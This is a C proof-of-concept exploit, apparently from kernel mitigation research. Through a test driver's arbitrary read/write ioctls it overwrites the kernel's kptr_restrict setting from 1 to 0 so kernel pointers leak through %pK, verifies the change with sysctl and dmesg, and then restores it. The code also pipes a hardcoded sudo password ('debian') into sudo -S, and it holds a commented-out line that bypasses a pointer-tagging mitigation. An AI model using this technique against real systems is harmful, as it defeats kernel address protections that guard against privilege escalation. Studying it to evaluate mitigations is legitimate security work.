// FZY: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define FIELD_SIZE 4

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_PRINT_KPTR _IO('A', 6)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

static int orig_kptr_restrict;

void verify_kptr_restrict_addr(int fd, unsigned long kptr_restrict_addr) {
  printf("[+] kptr_restrict address: 0x%lx\n", kptr_restrict_addr);

  arb_read(fd, kptr_restrict_addr, &orig_kptr_restrict, FIELD_SIZE);

  printf("[+] Setting kptr_restrict to 1 via sysctl command\n");
  fflush(stdout);
  system("sh -c 'echo debian | sudo -S sysctl -w kernel.kptr_restrict=1 2>/dev/null'");
  
  int current_value;
  arb_read(fd, kptr_restrict_addr, &current_value, FIELD_SIZE);
  printf("[+] Current value: %d\n", current_value);
}

void restore_kptr_restrict(int fd, unsigned long kptr_restrict_addr) {
  int readback;

  arb_write(fd, kptr_restrict_addr, &orig_kptr_restrict, FIELD_SIZE);
  arb_read(fd, kptr_restrict_addr, &readback, FIELD_SIZE);
  if (readback == orig_kptr_restrict)
    printf("\n[+] kptr_restrict restored to %d\n", orig_kptr_restrict);
  else
    printf("\n[-] kptr_restrict restore failed, now: %d\n", readback);
}

void overwrite_kptr_restrict(int fd, unsigned long kptr_restrict_addr) {
  int new_value = 0;
  printf("[+] Overwriting kptr_restrict to %d\n", new_value);
  arb_write(fd, kptr_restrict_addr, &new_value, FIELD_SIZE);

  int verify_value;
  arb_read(fd, kptr_restrict_addr, &verify_value, FIELD_SIZE);
  printf("[+] New value: %d\n", verify_value);

  if (verify_value != new_value) {
    printf("[-] Write verification failed! Expected %d but got %d\n", 
           new_value, verify_value);
  } else {
    printf("[+] Successfully overwritten!\n");
  }
}

void verify_sysctl_value() {
  printf("[+] Verifying via sysctl\n");

  FILE *fp;
  char buf[128];

  memset(buf, 0, sizeof(buf));

  fflush(stdout);
  fp = popen("sh -c 'echo debian | sudo -S sysctl kernel.kptr_restrict 2>/dev/null'", "r");
  if (!fp) {
      printf("[-] Failed to execute popen\n");
      return;
  }

  if (fgets(buf, sizeof(buf), fp) == NULL) {
      printf("[-] Failed to read from pipe\n");
      pclose(fp);
      return;
  }
  
  pclose(fp);

  buf[sizeof(buf) - 1] = '\0';
  
  size_t len = strlen(buf);
  if (len > 0 && buf[len - 1] == '\n') {
      buf[len - 1] = '\0';
  }

  printf("[+] %s\n", buf);

  if (strcmp(buf, "kernel.kptr_restrict = 0") == 0) {
      printf("[+] Verification successful\n");
  }
}

void test_kptr_format(int fd) {
  printf("\n[+] Testing kernel pointer format\n");
  
  if (ioctl(fd, ARB_PRINT_KPTR, 0) < 0) {
    perror("ARB_PRINT_KPTR ioctl");
    printf("[-] Failed to call ARB_PRINT_KPTR ioctl\n");
    return;
  }
  
  // FZY: ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
  // repeating the output of an earlier call
  printf("[+] Ioctl successful! Now check dmesg:\n");
  fflush(stdout);
  system("dmesg | tail -2");
}

int main(int argc, char *argv[]) {
  // FZY: Keep our printf output in order with the output of system()/popen()
  // children, which write to fd 1 directly
  setvbuf(stdout, NULL, _IOLBF, 0);

  printf("[+] kptr_restrict Exploitation PoC\n\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <kptr_restrict_addr>\n", argv[0]);
    printf("  mode: 0 (no protection), 1 (Sensitivity Tag), 2 (Sensitivity + TypeID Tag)\n");
    printf("  kptr_restrict_addr: nm vmlinux | grep 'kptr_restrict'\n");
    return 1;
  }

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open /dev/arb_rw");
    exit(1);
  }
  printf("[+] Opened /dev/arb_rw\n");
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("[-] Invalid mode\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long kptr_restrict_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    arb_read(arbrw_dev_fd, kptr_restrict_addr, &kptr_restrict_addr, sizeof(unsigned long));
    printf("[+] kptr_restrict address from kernel: 0x%lx\n", kptr_restrict_addr);
  
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // kptr_restrict_addr = kptr_restrict_addr | 0xFFFF000000000000;
  }
  
  verify_kptr_restrict_addr(arbrw_dev_fd, kptr_restrict_addr);

  test_kptr_format(arbrw_dev_fd);

  overwrite_kptr_restrict(arbrw_dev_fd, kptr_restrict_addr);

  verify_sysctl_value();

  test_kptr_format(arbrw_dev_fd);

  restore_kptr_restrict(arbrw_dev_fd, kptr_restrict_addr);

  close(arbrw_dev_fd);
  
  return 0;
}